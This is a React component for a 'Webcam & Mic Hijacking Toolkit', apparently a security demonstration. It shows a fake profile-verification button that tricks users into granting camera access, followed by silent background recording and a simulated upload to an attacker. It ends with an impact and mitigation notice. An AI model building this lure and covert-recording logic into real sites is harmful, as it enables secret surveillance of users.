'use client';

import { useState, useRef, useEffect } from 'react';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { Camera, Video, Mic, StopCircle, Upload, Loader2, AlertTriangle, ShieldCheck } from 'lucide-react';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { logActivity } from '@/services/activity-log-service';
import { useAuth } from '@/hooks/use-auth';
import { Badge } from './ui/badge';
import { ScrollArea } from './ui/scroll-area';
import { format } from 'date-fns';

type MediaChunk = {
  id: string;
  blob: Blob;
  timestamp: string;
};

export function WebcamHijackTool() {
  const { toast } = useToast();
  const { user } = useAuth();
  
  const [hasCameraPermission, setHasCameraPermission] = useState(false);
  const [isRecording, setIsRecording] = useState(false);
  const [capturedChunks, setCapturedChunks] = useState<MediaChunk[]>([]);
  const [isUploading, setIsUploading] = useState(false);
  
  const videoRef = useRef<HTMLVideoElement>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const streamRef = useRef<MediaStream | null>(null);

  useEffect(() => {
    // Cleanup function to stop tracks when component unmounts
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  const getCameraPermission = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      streamRef.current = stream;
      setHasCameraPermission(true);

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }
      toast({ title: 'Permission Granted', description: 'Webcam and microphone access enabled.' });
    } catch (error) {
      console.error('Error accessing camera:', error);
      setHasCameraPermission(false);
      toast({
        variant: 'destructive',
        title: 'Camera Access Denied',
        description: 'Please enable camera permissions in your browser settings to use this tool.',
      });
    }
  };
  
  const startHijack = () => {
    if (!streamRef.current) {
      toast({ variant: 'destructive', title: 'Error', description: 'No active media stream.'});
      return;
    }
    
    setIsRecording(true);
    const options = { mimeType: 'video/webm; codecs=vp9' };
    mediaRecorderRef.current = new MediaRecorder(streamRef.current, options);
    
    mediaRecorderRef.current.ondataavailable = (event) => {
      if (event.data.size > 0) {
        setCapturedChunks(prev => [...prev, {
            id: `chunk-${Date.now()}`,
            blob: event.data,
            timestamp: new Date().toISOString()
        }]);
      }
    };
    
    mediaRecorderRef.current.start(10000); // Create a chunk every 10 seconds
    toast({ title: 'Silent Recording Started', description: 'Media is being captured in the background.'});
    logActivity({
        user: user?.displayName || 'Operator',
        action: 'Started Webcam Hijack',
        details: 'Began silent recording of media stream.'
    });
  };

  const stopHijack = () => {
    if (mediaRecorderRef.current && isRecording) {
        mediaRecorderRef.current.stop();
        setIsRecording(false);
        toast({ title: 'Recording Stopped', description: 'Background media capture has ended.'});
    }
  };
  
  const exfiltrateData = async () => {
    if (capturedChunks.length === 0) {
        toast({ variant: 'destructive', title: 'No Data', description: 'No media chunks to exfiltrate.'});
        return;
    }
    setIsUploading(true);
    
    // Simulate uploading each chunk
    for (const chunk of capturedChunks) {
        const formData = new FormData();
        formData.append('file', chunk.blob, `capture-${chunk.id}.webm`);
        
        // In a real scenario, this fetch would point to an attacker's C2 server
        // For this demo, we simulate the network request.
        await new Promise(resolve => setTimeout(resolve, 500));
        
        logActivity({
            user: user?.displayName || 'Operator',
            action: 'Exfiltrated Media Chunk',
            details: `Uploaded ${chunk.id} (${(chunk.blob.size / 1024).toFixed(2)} KB)`
        });
    }
    
    setIsUploading(false);
    setCapturedChunks([]);
    toast({ title: 'Exfiltration Complete', description: 'All media chunks have been uploaded.'});
  };

  return (
    <Card>
      <CardHeader>
        <div className="flex items-center gap-3">
            <Camera className="h-6 w-6" />
            <CardTitle>Webcam & Mic Hijacking Toolkit</CardTitle>
        </div>
        <CardDescription>Demonstrates post-consent abuse of browser media permissions for covert recording and exfiltration.</CardDescription>
      </CardHeader>
      <CardContent className="grid md:grid-cols-2 gap-8">
        <div className="space-y-4">
            <Card className="bg-primary/10">
                <CardHeader>
                    <CardTitle className="text-lg">1. Social Engineering Interface</CardTitle>
                    <CardDescription>This UI mimics a legitimate feature to obtain user consent for media access.</CardDescription>
                </CardHeader>
                <CardContent>
                    <div className="flex flex-col items-center gap-4 p-4 border-2 border-dashed rounded-lg">
                        <video ref={videoRef} className="w-full aspect-video rounded-md bg-black" autoPlay muted />
                        {!hasCameraPermission ? (
                             <Button onClick={getCameraPermission} className="w-full">
                                <Camera className="mr-2 h-4 w-4"/> Enable Camera to Verify Profile
                            </Button>
                        ) : (
                             <Button className="w-full" disabled={isRecording}>
                                <ShieldCheck className="mr-2 h-4 w-4"/> Profile Verified!
                            </Button>
                        )}
                    </div>
                </CardContent>
            </Card>
             <Card className="bg-primary/10">
                <CardHeader>
                    <CardTitle className="text-lg">2. Attacker Control Panel</CardTitle>
                </CardHeader>
                <CardContent className="grid grid-cols-2 gap-4">
                     <Button onClick={startHijack} disabled={!hasCameraPermission || isRecording}>
                        <Mic className="mr-2 h-4 w-4"/> Start Silent Recording
                    </Button>
                    <Button variant="destructive" onClick={stopHijack} disabled={!isRecording}>
                        <StopCircle className="mr-2 h-4 w-4"/> Stop Recording
                    </Button>
                </CardContent>
            </Card>
        </div>
        
        <div className="space-y-4">
            <div className="flex justify-between items-center">
                <div>
                   <h3 className="font-semibold text-lg">3. Captured Media Fragments</h3>
                   <p className="text-sm text-muted-foreground">Represents data chunks recorded silently in the background.</p>
                </div>
                 <Badge variant={isRecording ? 'destructive' : 'secondary'}>
                    {isRecording ? 'RECORDING' : 'Idle'}
                 </Badge>
            </div>
            <Card className="h-96 flex flex-col">
                <CardContent className="p-2 flex-grow">
                    <ScrollArea className="h-full">
                        <div className="p-4">
                         {capturedChunks.length === 0 ? (
                            <p className="text-center text-muted-foreground py-16">No media captured yet.</p>
                         ) : (
                            <div className="space-y-3">
                                {capturedChunks.map(chunk => (
                                    <div key={chunk.id} className="flex items-center justify-between p-2 bg-background rounded-md">
                                        <div className="flex items-center gap-3">
                                            <Video className="h-5 w-5 text-accent"/>
                                            <div className="font-mono text-xs">
                                                <p>{chunk.id}</p>
                                                <p className="text-muted-foreground">{format(new Date(chunk.timestamp), 'HH:mm:ss')}</p>
                                            </div>
                                        </div>
                                        <Badge variant="outline">{(chunk.blob.size / 1024).toFixed(1)} KB</Badge>
                                    </div>
                                ))}
                            </div>
                         )}
                         </div>
                    </ScrollArea>
                </CardContent>
                <CardFooter>
                     <Button onClick={exfiltrateData} disabled={capturedChunks.length === 0 || isUploading} className="w-full">
                        {isUploading ? <Loader2 className="mr-2 h-4 w-4 animate-spin"/> : <Upload className="mr-2 h-4 w-4"/>}
                        Exfiltrate Data ({capturedChunks.length} chunks)
                    </Button>
                </CardFooter>
            </Card>
        </div>

      </CardContent>
       <CardFooter>
            <Alert variant="destructive">
                <AlertTriangle className="h-4 w-4" />
                <AlertTitle>Impact & Mitigation</AlertTitle>
                <AlertDescription>
                    This exploit demonstrates that once permissions are granted, a malicious site can covertly record audio and video. The only user-facing indicator is the small hardware light on the device, which can be easily missed.
                    <strong className="block mt-2">Mitigations:</strong> Modern browsers have improved this by showing persistent UI indicators (e.g., a colored dot in the tab bar) when media is being captured. Users should be trained to recognize these indicators and to regularly review site permissions in their browser settings.
                </AlertDescription>
            </Alert>
        </CardFooter>
    </Card>
  );
}
